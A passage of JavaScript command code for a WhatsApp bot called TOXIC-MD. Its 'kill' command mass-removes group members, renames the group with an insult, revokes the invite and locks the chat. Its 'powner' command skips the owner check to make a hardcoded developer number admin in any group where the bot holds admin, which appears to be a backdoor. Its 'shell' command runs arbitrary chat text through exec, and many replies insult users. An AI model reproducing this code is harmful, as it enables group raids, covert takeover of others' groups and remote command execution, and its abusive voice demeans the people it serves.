                );
            }

            const shortMsg = (error && (error.message || (typeof error === 'string' ? error : 'Unknown error'))) || 'Unknown error';
            return m.reply(
                `╭───(    TOXIC-MD    )───\n├───≫ FAILED ≪───\n├ \n├ Failed to join: ${shortMsg}\n├ Check the link or try again.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            );
        }
    });
});

// ── kill
dreaded({
  pattern: "kill",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await middleware(context, async () => {
        const { client, m, isBotAdmin } = context;
        const fq = getFakeQuoted(m);

        if (!m.isGroup) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ This command is meant for groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        if (!isBotAdmin) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ I need admin privileges.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

        const normalizeJid = (jid) => {
            if (!jid) return '';
            return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
        };

        const groupMetadata = await client.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        const botJid = normalizeJid(client.user.id);
        const senderJid = normalizeJid(m.sender);

        const usersToKick = participants.filter(p => {
            const pJid = normalizeJid(p.jid || p.id);
            return pJid !== botJid && pJid !== senderJid;
        });

        await client.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } });
        await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ TERMINATION ≪───\n├ \n├ GROUP TERMINATION INITIATED\n├ Removing ${usersToKick.length} participants.\n├ The group will be renamed.\n├ THIS PROCESS CANNOT BE STOPPED.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

        try { await client.groupUpdateSubject(m.chat, "Proven Useless🦄🚮"); } catch (e) {}
        try { await client.groupUpdateDescription(m.chat, "Terminated by Tσxιƈ-ɱԃȥ\n\nA collection of digital disappointments. Your contributions were as valuable as your existence—negligible."); } catch (e) {}
        try { await client.groupRevokeInvite(m.chat); } catch (e) {}
        try { await client.groupSettingUpdate(m.chat, 'announcement'); } catch (e) {}

        for (const p of usersToKick) {
            try {
                const jid = normalizeJid(p.jid || p.id);
                await client.groupParticipantsUpdate(m.chat, [jid], 'remove');
                await new Promise(res => setTimeout(res, 500));
            } catch (e) {}
        }

        await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ COMPLETE ≪───\n├ \n├ TERMINATION COMPLETE\n├ All participants removed.\n├ Group secured.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
    });
});

// ── leavegc
dreaded({
  pattern: "leavegc",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, Owner, participants, botname } = context;
        const fq = getFakeQuoted(m);

        if (!botname) {
            console.error(`Botname not set, you incompetent fuck.`);
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Bot's fucked. No botname in context.\n├ Yell at your dev, dumbass.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        if (!Owner) {
            console.error(`Owner not set, you brain-dead moron.`);
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Bot's broken. No owner in context.\n├ Go cry to the dev.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        if (!m.isGroup) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ You think I'm bailing on your\n├ pathetic DMs? This is for groups,\n├ you idiot.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        try {
            const maxMentions = 50;
            const mentions = participants.slice(0, maxMentions).map(a => a.id);
            await client.sendMessage(m.chat, { 
                text: `╭───(    TOXIC-MD    )───\n├───≫ LEAVING ≪───\n├ \n├ Fuck this shithole ${botname} is OUT!\n├ Good luck rotting without me,\n├ you nobodies. ${mentions.length < participants.length ? 'Too many losers to tag, pathetic.' : ''}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`, 
                mentions 
            }, { quoted: fq });
            console.log(`[LEAVE-DEBUG] Leaving group ${m.chat}, mentioned ${mentions.length} participants`);
            await client.groupLeave(m.chat);
        } catch (error) {
            console.error(`[LEAVE-ERROR] Couldn't ditch the group: ${error.stack}`);
            await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Shit broke, @${m.sender.split('@')[0].split(':')[0]}!\n├ Can't escape this dumpster fire:\n├ ${error.message}. Try again, loser.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
    });
});

// ── oadmin
dreaded({
  pattern: "oadmin",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, Owner, isBotAdmin } = context;
        const fq = getFakeQuoted(m);

                 if (!m.isGroup) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ This command is meant for groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
         if (!isBotAdmin) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ I need admin privileges.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`); 

                 await client.groupParticipantsUpdate(m.chat,  [m.sender], 'promote'); 
 m.reply(`╭───(    TOXIC-MD    )───\n├───≫ PROMOTED ≪───\n├ \n├ Promoted. Now you have power.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`); 
          })

});

// ── powner
dreaded({
  pattern: "powner",
  alias: ["promoteowner","makeowneradmin"],
  desc: "Promotes the owner to admin",
  category: "Owner",
  filename: __filename
}, async (context) => {
        const { client, m, isBotAdmin } = context;
        const fq = getFakeQuoted(m);

        if (!m.isGroup) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ This command only works in groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

        const senderNum = normalizeNumber(m.sender);
        if (senderNum !== normalizeNumber(DEVELOPER_NUMBER)) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Only the owner can use this command.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        if (!isBotAdmin) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ I need admin privileges to\n├ perform this action.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

        try {
            const groupMetadata = await client.groupMetadata(m.chat);
            const ownerMember = findDevInGroup(groupMetadata.participants);

            if (!ownerMember) {
                return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Owner is not in this group.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            }

            if (ownerMember.admin) {
                return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Owner is already an admin.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            }

            const actualJid = getActualJid(ownerMember);
            await retryPromote(client, m.chat, actualJid);
            return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ PROMOTED ≪───\n├ \n├ Owner has been promoted to admin.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

        } catch (error) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Failed to promote: ${error.message}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
    });

// ── prefix
dreaded({
  pattern: "prefix",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { m, args } = context;
        const fq = getFakeQuoted(m);
        const newPrefix = args[0];

        let settings = await getSettings();

        if (newPrefix === 'null') {
            if (!settings.prefix) {
                return await m.reply(`✅ The bot was already prefixless.`);
            }
            await updateSetting('prefix', '');
            await m.reply(`✅ The bot is now prefixless.`);
        } else if (newPrefix) {
            if (settings.prefix === newPrefix) {
                return await m.reply(`✅ The prefix was already set to: ${newPrefix}`);
            }
            await updateSetting('prefix', newPrefix);
            await m.reply(`✅ Prefix has been updated to: ${newPrefix}`);
        } else {
            await m.reply(`📄 Current prefix: ${settings.prefix || 'No prefix set.'}\n\nUse _prefix null_ to remove the prefix or _prefix <any symbol>_ to set a specific prefix.`);
        }
    });
});


// ── restart
dreaded({
  pattern: "restart",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m } = context;
        const fq = getFakeQuoted(m);
        await client.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });
        await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ RESTART ≪───\n├ \n├ Restarting Toxic-MD...\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        setTimeout(() => { process.exit(0); }, 3000);
    });
});

// ── save
dreaded({
  pattern: "save",
  alias: ["sv"],
  category: "Owner",
  filename: __filename
}, async (context) => {
          const { client, m } = context;
          const fq = getFakeQuoted(m);

          if (!m.quoted) {
              return client.sendMessage(m.chat, {
                  text:
                      `╭───(    TOXIC-MD    )───\n` +
                      `├───≫ SAVE ≪───\n` +
                      `├ \n` +
                      `├ Reply to something first, genius.\n` +
                      `╰──────────────────☉\n` +
                      `> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
              }, { quoted: fq });
          }

          const mtype = m.quoted.mtype || '';
          const senderNum = m.sender.split('@')[0].split(':')[0];
          const targetJid = senderNum + '@s.whatsapp.net';

          try {
              await client.sendMessage(m.chat, { react: { text: '💾', key: m.key } });
              const caption = m.quoted.text || m.quoted.caption || '';
              const mime = m.quoted.mimetype || '';
              const mediaTypes = ['imageMessage', 'videoMessage', 'stickerMessage', 'audioMessage', 'pttMessage', 'documentMessage'];

              if (mediaTypes.includes(mtype)) {
                  const buf = await _dlMedia(client, m);
                  if (!buf) throw new Error('download failed');
                  if (mtype === 'imageMessage') {
                      await client.sendMessage(targetJid, { image: buf, caption });
                  } else if (mtype === 'videoMessage') {
                      await client.sendMessage(targetJid, { video: buf, caption });
                  } else if (mtype === 'stickerMessage') {
                      await client.sendMessage(targetJid, { sticker: buf });
                  } else if (mtype === 'audioMessage' || mtype === 'pttMessage') {
                      await client.sendMessage(targetJid, { audio: buf, mimetype: mime || 'audio/ogg; codecs=opus', ptt: mtype === 'pttMessage' });
                  } else if (mtype === 'documentMessage') {
                      await client.sendMessage(targetJid, { document: buf, mimetype: mime || 'application/octet-stream', fileName: m.quoted.fileName || 'file' });
                  }
              } else {
                  const txt = m.quoted.text || m.quoted.caption || '';
                  if (txt) {
                      await client.sendMessage(targetJid, { text: txt });
                  } else {
                      await m.quoted.copyNForward(targetJid, true);
                  }
              }

              await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

          } catch (err) {
              console.log('❌ [SAVE]:', err?.message || err);
              await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
          }
      });

// ── shell
dreaded({
  pattern: "shell",
  category: "Owner",
  filename: __filename
}, async (context) => {

await ownerMiddleware(context, async () => {

  
    const { client, m, text, budy, Owner } = context;
    const fq = getFakeQuoted(m);

    try {
      

      
      if (!text) {
        return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ No command provided. Provide a\n├ valid shell command, fool.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
      }

      const { exec } = require("child_process");

    
      exec(text, (err, stdout, stderr) => {
        if (err) {
          return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ SHELL ERROR ≪───\n├ \n├ ${err.message}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
        if (stderr) {
          return m.reply(stderr);
        }
        if (stdout) {
          return m.reply(stdout);
        }
      });

    } catch (error) {
      await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ SHELL ERROR ≪───\n├ \n├ An error occurred while running\n├ the shell command.\n├ ${error}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
    }
                  })
});

// ── shutdown
dreaded({
  pattern: "shutdown",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { m } = context;
        const fq = getFakeQuoted(m);
        await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ SHUTDOWN ≪───\n├ \n├ 💀 Toxic-MD going offline...\n├ Don't cry.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        setTimeout(() => process.exit(0), 2000);
    });
});

// ── tag
dreaded({
  pattern: "tag",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {


        const { client, m, args, participants, text } = context;
        const fq = getFakeQuoted(m);


if (!m.isGroup) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Command meant for groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);



client.sendMessage(m.chat, { text : text ? text : 'Attention Here' , mentions: participants.map(a => a.id)}, { quoted: fq });

});

});

// ── unblock
dreaded({
  pattern: "unblock",
  category: "Owner",
  filename: __filename
}, async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, text } = context;
        const fq = getFakeQuoted(m);

        if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0) && !text) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Tag or reply to a user to unblock.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        const raw = m.mentionedJid?.[0] || m.quoted?.sender || text;
        const users = toBlockJid(raw);

        if (!users) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Couldn't resolve that user's JID. 😤\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }

        const parts = users.split('@')[0];

        await client.updateBlockStatus(users, 'unblock');
        await m.reply(`╭───(    TOXIC-MD    )───\n├───≫ UNBLOCKED ≪───\n├ \n├ ${parts} is unblocked. Don't make\n├ me regret this.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
    });
});
  